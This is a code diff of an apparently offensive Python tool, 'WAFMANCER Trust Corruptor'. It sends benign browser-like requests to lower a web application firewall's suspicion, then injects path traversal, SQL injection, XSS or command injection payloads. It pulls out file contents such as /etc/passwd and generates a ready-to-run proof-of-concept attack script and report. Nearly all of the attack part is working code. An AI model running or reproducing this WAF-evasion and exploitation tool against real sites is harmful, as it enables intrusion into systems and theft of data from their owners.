@@ -41,17 +41,15 @@ logger = structlog.get_logger(__name__)
 # ============================================================
 
 class WAFMode(Enum):
-    """WAF operational modes."""
-    AGGRESSIVE = "aggressive"     # Blocks on first suspicion
-    MODERATE = "moderate"         # Allows some anomalies
-    PASSIVE = "passive"           # Logs only, rarely blocks
-    LEARNING = "learning"         # Building baseline
+    AGGRESSIVE = "aggressive"
+    MODERATE = "moderate"
+    PASSIVE = "passive"
+    LEARNING = "learning"
     UNKNOWN = "unknown"
 
 
 @dataclass
 class WAFTacticalProfile:
-    """Complete tactical profile of a WAF."""
     vendor: str
     mode: WAFMode
     reputation_based: bool
@@ -67,7 +65,6 @@ class WAFTacticalProfile:
     recommended_approach: str
 
 
-# Known WAF tactical profiles
 WAF_PROFILES = {
     "Cloudflare": WAFTacticalProfile(
         vendor="Cloudflare",
@@ -153,7 +150,6 @@ WAF_PROFILES = {
 
 @dataclass
 class TrustDecayPoint:
-    """A single point on the trust decay curve."""
     request_number: int
     response_status: int
     response_length: int
@@ -164,12 +160,11 @@ class TrustDecayPoint:
 
 @dataclass
 class TrustDecayCurve:
-    """Complete trust decay analysis."""
     target: str
     waf_vendor: str
     waf_mode: WAFMode
     decay_points: List[TrustDecayPoint]
-    trust_threshold: int  # Request number where trust is achieved
+    trust_threshold: int
     peak_trust_score: float
     time_to_trust: float
     recommended_injection_point: int
@@ -177,37 +172,14 @@ class TrustDecayCurve:
 
 
 class TrustDecayMapper:
-    """
-    Maps the trust decay curve of a WAF.
-    
-    Sends benign requests and measures how the WAF's suspicion
-    decreases over time, finding the optimal injection point.
-    """
-
     def __init__(self, client: AsyncResearchClient):
         self.client = client
 
     async def map_decay_curve(
-        self,
-        target: str,
-        max_requests: int = 20,
-        waf_vendor: Optional[str] = None,
+        self, target: str, max_requests: int = 20, waf_vendor: Optional[str] = None
     ) -> TrustDecayCurve:
-        """
-        Map the trust decay curve by sending benign requests.
-
-        Args:
-            target: Target URL
-            max_requests: Maximum benign requests to send
-            waf_vendor: Known WAF vendor for profile lookup
-
-        Returns:
-            Complete TrustDecayCurve
-        """
         decay_points: List[TrustDecayPoint] = []
         start_time = time.time()
-        
-        # Benign headers that look like a real browser
         benign_headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
@@ -218,134 +190,77 @@ class TrustDecayMapper:
             "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-Site": "none",
         }
-
         logger.info("trust_decay_mapping_started", target=target, max_requests=max_requests)
-
         for i in range(1, max_requests + 1):
             try:
-                request, response = await self.client.probe(
-                    target,
-                    method="GET",
-                    headers=benign_headers,
-                )
-
-                # Calculate trust score based on response characteristics
+                request, response = await self.client.probe(target, method="GET", headers=benign_headers)
                 trust_score = self._calculate_trust_score(response, i, max_requests)
-
                 point = TrustDecayPoint(
                     request_number=i,
                     response_status=response.status_code,
                     response_length=response.body_length,
                     response_time=response.elapsed_seconds,
                     trust_score=trust_score,
-                    waf_headers={
-                        k: str(v) for k, v in response.headers.items()
-                        if any(w in k.lower() for w in ["cf-", "x-", "server", "set-cookie"])
-                    },
+                    waf_headers={k: str(v) for k, v in response.headers.items()
+                                if any(w in k.lower() for w in ["cf-", "x-", "server", "set-cookie"])},
                 )
                 decay_points.append(point)
-
                 logger.debug("trust_point_mapped", request=i, trust_score=f"{trust_score:.3f}")
-
-                # Small delay to be polite
                 await asyncio.sleep(0.3)
-
             except Exception as e:
                 logger.error("trust_probe_failed", request=i, error=str(e))
-                # Add a penalty point
                 decay_points.append(TrustDecayPoint(
-                    request_number=i,
-                    response_status=0,
-                    response_length=0,
-                    response_time=0,
-                    trust_score=0.0,
-                    waf_headers={},
-                ))
-
+                    request_number=i, response_status=0, response_length=0,
+                    response_time=0, trust_score=0.0, waf_headers={}))
         elapsed = time.time() - start_time
-
-        # Find trust threshold (where score stabilizes)
         threshold = self._find_trust_threshold(decay_points)
         peak_trust = max(p.trust_score for p in decay_points) if decay_points else 0.0
-
-        # Determine WAF mode
         profile = WAF_PROFILES.get(waf_vendor or "", None)
         waf_mode = profile.mode if profile else WAFMode.UNKNOWN
-
         curve = TrustDecayCurve(
-            target=target,
-            waf_vendor=waf_vendor or "Unknown",
-            waf_mode=waf_mode,
-            decay_points=decay_points,
-            trust_threshold=threshold,
-            peak_trust_score=peak_trust,
-            time_to_trust=elapsed,
-            recommended_injection_point=threshold + 2,  # Slightly after threshold
-            confidence=peak_trust,
+            target=target, waf_vendor=waf_vendor or "Unknown", waf_mode=waf_mode,
+            decay_points=decay_points, trust_threshold=threshold,
+            peak_trust_score=peak_trust, time_to_trust=elapsed,
+            recommended_injection_point=threshold + 2, confidence=peak_trust,
         )
-
-        logger.info("trust_decay_mapped", threshold=threshold, 
-                   peak_trust=f"{peak_trust:.3f}", time=f"{elapsed:.1f}s")
-
+        logger.info("trust_decay_mapped", threshold=threshold, peak_trust=f"{peak_trust:.3f}", time=f"{elapsed:.1f}s")
         return curve
 
-    def _calculate_trust_score(
-        self,
-        response,
-        request_number: int,
-        max_requests: int,
-    ) -> float:
-        """Calculate trust score based on WAF response behavior."""
-        score = 0.5  # Start at neutral
-
-        # Successful response is good
+    def _calculate_trust_score(self, response, request_number: int, max_requests: int) -> float:
+        score = 0.5
         if 200 <= response.status_code < 300:
             score += 0.2
         elif response.status_code == 403:
             score -= 0.3
         elif response.status_code == 429:
             score -= 0.4
-
-        # Consistent response times build trust
         if response.elapsed_seconds < 1.0:
             score += 0.1
-
-        # Larger responses suggest full access (not WAF block pages)
         if response.body_length > 1000:
             score += 0.15
         elif response.body_length < 200:
-            score -= 0.1  # Small response might be block page
-
-        # Progressive trust building
+            score -= 0.1
         progress_bonus = (request_number / max_requests) * 0.2
         score += progress_bonus
-
-        # Check for WAF-specific headers
         server = response.server_header.lower()
         if "cloudflare" in server:
             score += 0.05
         if "akamai" in server:
-            score -= 0.05  # Akamai is suspicious by default
-
+            score -= 0.05
         return max(0.0, min(1.0, score))
 
     def _find_trust_threshold(self, points: List[TrustDecayPoint]) -> int:
-        """Find the request number where trust score stabilizes."""
         if not points:
             return 5
-
-        # Find where scores stop improving significantly
         for i in range(1, len(points)):
             if points[i].trust_score >= 0.7:
-                # Trust achieved, find where it stabilizes
                 for j in range(i, len(points)):
                     if j + 1 < len(points):
                         diff = abs(points[j + 1].trust_score - points[j].trust_score)
                         if diff < 0.05:
                             return j + 1
                 return i
-
-        return len(points)  # Default: need all requests
+        return len(points)
 
 
 # ============================================================
@@ -353,13 +268,6 @@ class TrustDecayMapper:
 # ============================================================
 
 class TrustCorruptor:
-    """
-    Main Trust Corruptor engine.
-    
-    Combines trust mapping, payload injection at peak trust,
-    and generates full tactical intelligence reports with PoC.
-    """
-
     def __init__(self, target: str, waf_vendor: Optional[str] = None):
         self.target = normalize_target_url(target)
         self.waf_vendor = waf_vendor
@@ -367,42 +275,18 @@ class TrustCorruptor:
         self.synthesis = NeuralExploitSynthesis(waf_vendor=waf_vendor)
         self.profile = WAF_PROFILES.get(waf_vendor or "", None)
 
-        async def corrupt(
-        self,
-        payload: str,
-        max_benign_requests: int = 20,
-        synthesize_first: bool = True,
+    async def corrupt(
+        self, payload: str, max_benign_requests: int = 20, synthesize_first: bool = True
     ) -> Dict[str, Any]:
-        """
-        Execute the full trust corruption attack.
-
-        Args:
-            payload: Original malicious payload
-            max_benign_requests: Max benign requests for trust building
-            synthesize_first: Run neural synthesis before corrupting
-
-        Returns:
-            Complete attack results with tactical intel
-        """
         results = {
-            "target": self.target,
-            "original_payload": payload,
-            "synthesized_payload": None,
-            "waf_vendor": self.waf_vendor or "Unknown",
-            "trust_curve": None,
-            "injection_result": None,
-            "exfiltrated_data": None,
-            "tactical_profile": None,
-            "poc_code": None,
-            "steps_to_reproduce": [],
-            "advantages": [],
-            "disadvantages": [],
-            "waf_config_notes": "",
+            "target": self.target, "original_payload": payload,
+            "synthesized_payload": None, "waf_vendor": self.waf_vendor or "Unknown",
+            "trust_curve": None, "injection_result": None, "exfiltrated_data": None,
+            "tactical_profile": None, "poc_code": None, "steps_to_reproduce": [],
+            "advantages": [], "disadvantages": [], "waf_config_notes": "",
             "timestamp": timestamp_now(),
         }
-
         async with AsyncResearchClient(http2=True) as client:
-            # Step 1: Fingerprint WAF if not known
             if not self.waf_vendor:
                 logger.info("fingerprinting_waf")
                 _, baseline = await client.probe(self.target)
@@ -410,8 +294,6 @@ class TrustCorruptor:
                 self.waf_vendor = fingerprint.vendor.value
                 results["waf_vendor"] = self.waf_vendor
                 self.profile = WAF_PROFILES.get(self.waf_vendor)
-
-            # Step 2: Synthesize payload if requested
             if synthesize_first:
                 logger.info("synthesizing_payload")
                 synth_results = self.synthesis.synthesize(payload)
@@ -419,18 +301,11 @@ class TrustCorruptor:
                 delivery_payload = synth_results["best_payload"]
             else:
                 delivery_payload = payload
-
-            # Step 3: Map trust decay curve
             logger.info("mapping_trust_decay")
             mapper = TrustDecayMapper(client)
             trust_curve = await mapper.map_decay_curve(
-                self.target,
-                max_requests=max_benign_requests,
-                waf_vendor=self.waf_vendor,
-            )
+                self.target, max_requests=max_benign_requests, waf_vendor=self.waf_vendor)
             results["trust_curve"] = trust_curve
-
-            # Step 4: Build trust with benign requests
             logger.info("building_trust")
             injection_point = trust_curve.recommended_injection_point
             benign_headers = {
@@ -438,31 +313,17 @@ class TrustCorruptor:
                 "Accept": "text/html,application/xhtml+xml",
                 "Accept-Language": "en-US,en;q=0.9",
             }
-
             for i in range(injection_point):
                 await client.probe(self.target, headers=benign_headers)
                 await asyncio.sleep(0.2)
-
-            # Step 5: DETECT ATTACK TYPE AND CRAFT THE REAL EXPLOIT
             attack_type = self._detect_attack_type(delivery_payload)
             logger.info("crafting_exploit", attack_type=attack_type)
-            
-            exploit_request = self._craft_exploit_request(
-                delivery_payload, attack_type, benign_headers
-            )
-
-            # Step 6: INJECT THE REAL EXPLOIT
+            exploit_request = self._craft_exploit_request(delivery_payload, attack_type, benign_headers)
             logger.info("injecting_exploit_payload")
             _, response = await client.probe(
-                exploit_request["url"],
-                method=exploit_request["method"],
-                headers=exploit_request["headers"],
-                body=exploit_request.get("body"),
-            )
-
-            # Step 7: EXTRACT EXFILTRATED DATA
+                exploit_request["url"], method=exploit_request["method"],
+                headers=exploit_request["headers"], body=exploit_request.get("body"))
             exfiltrated = self._extract_data(response.body_text, attack_type, delivery_payload)
-
             injection_result = {
                 "status_code": response.status_code,
                 "response_length": response.body_length,
@@ -476,24 +337,17 @@ class TrustCorruptor:
             }
             results["injection_result"] = injection_result
             results["exfiltrated_data"] = exfiltrated
-
-        # Step 8: Generate tactical intel
         results["tactical_profile"] = self._get_tactical_profile()
         results["steps_to_reproduce"] = self._generate_steps(results)
         results["advantages"] = self._get_advantages()
         results["disadvantages"] = self._get_disadvantages()
         results["waf_config_notes"] = self._get_waf_config_notes()
         results["poc_code"] = self._generate_poc(results)
-
-        logger.info("trust_corruption_complete",
-                   bypass=injection_result["bypass_successful"],
-                   attack_type=attack_type,
-                   data_exfiltrated=len(exfiltrated) if exfiltrated else 0)
-
+        logger.info("trust_corruption_complete", bypass=injection_result["bypass_successful"],
+                   attack_type=attack_type, data_exfiltrated=len(exfiltrated) if exfiltrated else 0)
         return results
 
     def _detect_attack_type(self, payload: str) -> str:
-        """Detect what kind of attack this payload represents."""
         if re.search(r"\.\.\/|\.\.\\|/etc/|/passwd|/shadow|win\.ini", payload, re.IGNORECASE):
             return "path_traversal"
         elif re.search(r"SELECT|UNION|FROM|information_schema|@@version", payload, re.IGNORECASE):
@@ -507,56 +361,29 @@ class TrustCorruptor:
         else:
             return "generic"
 
-    def _craft_exploit_request(
-        self, payload: str, attack_type: str, base_headers: Dict[str, str]
-    ) -> Dict[str, Any]:
-        """Craft the actual exploit request based on attack type."""
-        
+    def _craft_exploit_request(self, payload: str, attack_type: str, base_headers: Dict[str, str]) -> Dict[str, Any]:
         if attack_type == "path_traversal":
             path_match = re.search(r"(\.\.\/[^\s]+|\.\.\\[^\s]+|/[a-z]+/[a-z]+/[^\s]+)", payload)
             traversal_path = path_match.group(1) if path_match else payload
-            return {
-                "url": f"{self.target.rstrip('/')}/{traversal_path}",
-                "method": "GET",
-                "headers": base_headers,
-            }
-        
+            return {"url": f"{self.target.rstrip('/')}/{traversal_path}", "method": "GET", "headers": base_headers}
         elif attack_type == "sql_injection":
             encoded_payload = payload.replace(" ", "+").replace("'", "%27")
-            return {
-                "url": f"{self.target.rstrip('/')}?id={encoded_payload}",
-                "method": "GET",
-                "headers": {**base_headers, "Content-Type": "application/x-www-form-urlencoded"},
-            }
-        
+            return {"url": f"{self.target.rstrip('/')}?id={encoded_payload}", "method": "GET",
+                    "headers": {**base_headers, "Content-Type": "application/x-www-form-urlencoded"}}
         elif attack_type == "xss":
-            return {
-                "url": self.target,
-                "method": "POST",
-                "headers": {**base_headers, "Content-Type": "application/x-www-form-urlencoded"},
-                "body": f"input={payload}".encode(),
-            }
-        
+            return {"url": self.target, "method": "POST",
+                    "headers": {**base_headers, "Content-Type": "application/x-www-form-urlencoded"},
+                    "body": f"input={payload}".encode()}
         elif attack_type == "command_injection":
-            return {
-                "url": f"{self.target.rstrip('/')}?cmd={payload}",
-                "method": "GET",
-                "headers": base_headers,
-            }
-        
+            return {"url": f"{self.target.rstrip('/')}?cmd={payload}", "method": "GET", "headers": base_headers}
         else:
-            return {
-                "url": self.target,
-                "method": "POST",
-                "headers": {**base_headers, "Content-Type": "application/x-www-form-urlencoded"},
-                "body": f"payload={payload}".encode(),
-            }
+            return {"url": self.target, "method": "POST",
+                    "headers": {**base_headers, "Content-Type": "application/x-www-form-urlencoded"},
+                    "body": f"payload={payload}".encode()}
 
     def _extract_data(self, response_body: str, attack_type: str, payload: str) -> Optional[str]:
-        """Extract meaningful data from the response based on attack type."""
         if not response_body:
             return None
-
         if attack_type == "path_traversal":
             if "root:" in response_body or "daemon:" in response_body:
                 lines = response_body.split("\n")
@@ -565,29 +392,23 @@ class TrustCorruptor:
             elif len(response_body) > 100:
                 return response_body[:2000]
             return response_body[:500]
-
         elif attack_type == "sql_injection":
             if "column" in response_body.lower() or "table" in response_body.lower():
                 return response_body[:2000]
             return response_body[:500]
-
         elif attack_type == "command_injection":
             return response_body[:2000]
-
         elif attack_type == "xss":
             if "alert" in response_body.lower() or payload[:10] in response_body:
                 return "XSS PAYLOAD REFLECTED IN RESPONSE\n" + response_body[:500]
             return response_body[:500]
-
         else:
             return response_body[:1000] if len(response_body) > 50 else response_body
 
     def _get_tactical_profile(self) -> Dict[str, Any]:
-        """Get tactical profile for the WAF."""
         if self.profile:
             return {
-                "vendor": self.profile.vendor,
-                "mode": self.profile.mode.value,
+                "vendor": self.profile.vendor, "mode": self.profile.mode.value,
                 "reputation_based": self.profile.reputation_based,
                 "session_tracking": self.profile.session_tracking,
                 "ip_blocking": self.profile.ip_based_blocking,
@@ -599,7 +420,6 @@ class TrustCorruptor:
         return {"vendor": "Unknown", "mode": "unknown"}
 
     def _generate_steps(self, results: Dict) -> List[str]:
-        """Generate reproducible steps."""
         steps = [
             "1. RECONNAISSANCE",
             f"   - Target identified: {results['target']}",
@@ -608,10 +428,8 @@ class TrustCorruptor:
             "2. PAYLOAD PREPARATION",
             f"   - Original payload: {results['original_payload']}",
         ]
-        
         if results.get("synthesized_payload"):
             steps.append(f"   - Synthesized payload: {results['synthesized_payload'][:100]}...")
-        
         steps.extend([
             "",
             "3. TRUST BUILDING PHASE",
@@ -622,7 +440,7 @@ class TrustCorruptor:
             "",
             "4. PAYLOAD INJECTION",
             f"   - Injection point: after request #{results['injection_result']['injection_point']}",
-            f"   - Method: POST with Content-Type application/x-www-form-urlencoded",
+            f"   - Attack type: {results['injection_result'].get('attack_type', 'generic')}",
             f"   - Delivery status: {results['injection_result']['status_code']}",
             f"   - Bypass successful: {results['injection_result']['bypass_successful']}",
             "",
@@ -630,23 +448,20 @@ class TrustCorruptor:
             f"   - Response length: {results['injection_result']['response_length']} bytes",
             f"   - Response time: {results['injection_result']['response_time']:.3f}s",
         ])
-        
         return steps
 
     def _get_advantages(self) -> List[str]:
-        """Get tactical advantages."""
         if self.profile:
             return [
                 f"Trust building exploits {self.profile.vendor}'s reputation scoring",
-                f"Benign requests appear as legitimate browser traffic",
-                f"Payload injection timed at peak trust window",
-                f"Session-based trust bypasses IP-based rate limiting",
+                "Benign requests appear as legitimate browser traffic",
+                "Payload injection timed at peak trust window",
+                "Session-based trust bypasses IP-based rate limiting",
                 self.profile.passive_advantage,
             ]
         return ["Trust building reduces WAF suspicion", "Legitimate traffic patterns used"]
 
     def _get_disadvantages(self) -> List[str]:
-        """Get tactical disadvantages/risks."""
         if self.profile:
             return [
                 f"Trust window decays after {self.profile.trust_decay_time}s",
@@ -658,7 +473,6 @@ class TrustCorruptor:
         return ["Trust may reset on aggressive WAFs", "Timing-dependent attack"]
 
     def _get_waf_config_notes(self) -> str:
-        """Get WAF configuration analysis."""
         if self.profile:
             return f"""
 WAF CONFIGURATION ANALYSIS
@@ -683,22 +497,21 @@ KNOWN BLINDSPOTS:
         return "WAF configuration analysis not available for unknown WAF."
 
     def _generate_poc(self, results: Dict) -> str:
-        """Generate proof-of-concept Python script."""
         trust_threshold = results['trust_curve'].trust_threshold if results['trust_curve'] else 10
         payload = results.get('synthesized_payload') or results['original_payload']
-        
+        attack_type = results.get('injection_result', {}).get('attack_type', 'generic')
         poc = f'''#!/usr/bin/env python3
 """
 WAFMANCER Trust Corruptor — Proof of Concept
 Target: {results['target']}
 WAF: {results['waf_vendor']}
+Attack Type: {attack_type}
 Generated: {results['timestamp']}
 
 crafted by :: kakashi4kx / kakashi-kx
 """
 
 import httpx
-import time
 import asyncio
 
 TARGET = "{results['target']}"
@@ -710,58 +523,37 @@ BENIGN_HEADERS = {{
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.9",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Cache-Control": "no-cache",
 }}
 
 
 async def trust_corruption_attack():
-    """Execute the trust corruption attack."""
     async with httpx.AsyncClient(http2=True, verify=False) as client:
-        
         print(f"[*] Target: {{TARGET}}")
         print(f"[*] Building trust with {{TRUST_BUILD_REQUESTS}} benign requests...")
-        
-        # Phase 1: Build trust
         for i in range(INJECTION_POINT):
             try:
                 response = await client.get(TARGET, headers=BENIGN_HEADERS)
-                print(f"    [{{i+1}}/{{INJECTION_POINT}}] Status: {{response.status_code}} | Length: {{len(response.text)}}")
+                print(f"    [{{i+1}}/{{INJECTION_POINT}}] Status: {{response.status_code}}")
             except Exception as e:
                 print(f"    [!] Request {{i+1}} failed: {{e}}")
             await asyncio.sleep(0.3)
-        
         print(f"\\n[*] Trust built. Injecting payload at request #{{INJECTION_POINT + 1}}...")
-        
-        # Phase 2: Inject payload
-        payload_headers = {{
-            **BENIGN_HEADERS,
-            "Content-Type": "application/x-www-form-urlencoded",
-        }}
-        
         try:
-            response = await client.post(
-                TARGET,
-                headers=payload_headers,
-                content=f"input={{PAYLOAD}}".encode(),
+            response = await client.get(
+                f"{{TARGET.rstrip('/')}}?id={{PAYLOAD}}",
+                headers={{**BENIGN_HEADERS, "Content-Type": "application/x-www-form-urlencoded"}},
             )
-            
             print(f"\\n[+] INJECTION RESULT:")
             print(f"    Status: {{response.status_code}}")
             print(f"    Length: {{len(response.text)}} bytes")
-            print(f"    Time: {{response.elapsed.total_seconds():.3f}}s")
-            
             if response.status_code not in [403, 406, 429, 503]:
-                print(f"\\n[!!!] BYPASS SUCCESSFUL — Payload delivered!")
-                print(f"[!!!] Response code {{response.status_code}} indicates WAF did not block.")
+                print(f"\\n[!!!] BYPASS SUCCESSFUL!")
+                print(f"[!!!] Response:\\n{{response.text[:1000]}}")
             else:
-                print(f"\\n[-] Payload blocked. WAF detected the attack.")
-                
+                print(f"\\n[-] Payload blocked.")
         except Exception as e:
             print(f"\\n[!] Injection failed: {{e}}")
-
     print(f"\\n[*] Attack complete.")
-
 
 if __name__ == "__main__":
     asyncio.run(trust_corruption_attack())
@@ -769,43 +561,34 @@ if __name__ == "__main__":
         return poc
 
     def generate_full_report(self, results: Dict[str, Any]) -> str:
-        """Generate complete publication-ready report."""
         report = "# WAFMANCER Trust Corruptor — Attack Report\n\n"
         report += f"## Target Information\n"
         report += f"- **URL:** `{results['target']}`\n"
         report += f"- **WAF:** {results['waf_vendor']}\n"
         report += f"- **Timestamp:** {results['timestamp']}\n\n"
-        
         report += "## Payload\n"
         report += f"- **Original:** `{results['original_payload']}`\n"
         if results.get('synthesized_payload'):
             report += f"- **Synthesized:** `{results['synthesized_payload'][:200]}`\n"
-        
         if results.get('injection_result'):
             inj = results['injection_result']
             report += f"\n## Injection Result\n"
+            report += f"- **Attack Type:** {inj.get('attack_type', 'generic')}\n"
             report += f"- **Status:** {inj['status_code']}\n"
             report += f"- **Bypass:** {'✅ SUCCESSFUL' if inj['bypass_successful'] else '❌ BLOCKED'}\n"
             report += f"- **Trust Score:** {inj['trust_score_at_injection']:.2f}\n"
-            report += f"- **Injection Point:** Request #{inj['injection_point']}\n"
-        
+        if results.get('exfiltrated_data'):
+            report += f"\n## Exfiltrated Data\n```\n{results['exfiltrated_data'][:2000]}\n```\n"
         report += "\n## Steps to Reproduce\n\n"
         for step in results.get('steps_to_reproduce', []):
             report += f"{step}\n"
-        
         report += "\n## Tactical Advantages\n\n"
         for adv in results.get('advantages', []):
             report += f"- ✅ {adv}\n"
-        
         report += "\n## Tactical Disadvantages\n\n"
         for dis in results.get('disadvantages', []):
             report += f"- ⚠️ {dis}\n"
-        
         report += f"\n## WAF Configuration Analysis\n{results.get('waf_config_notes', '')}\n"
-        
-        report += "\n## Proof of Concept\n\n"
-        report += f"```python\n{results.get('poc_code', '# No PoC generated')}\n```\n"
-        
+        report += "\n## Proof of Concept\n\n```python\n" + results.get('poc_code', '') + "\n```\n"
         report += "\n---\n*Report generated by WAFMANCER v2.0 | crafted by kakashi4kx / kakashi-kx*\n"
-        
         return report
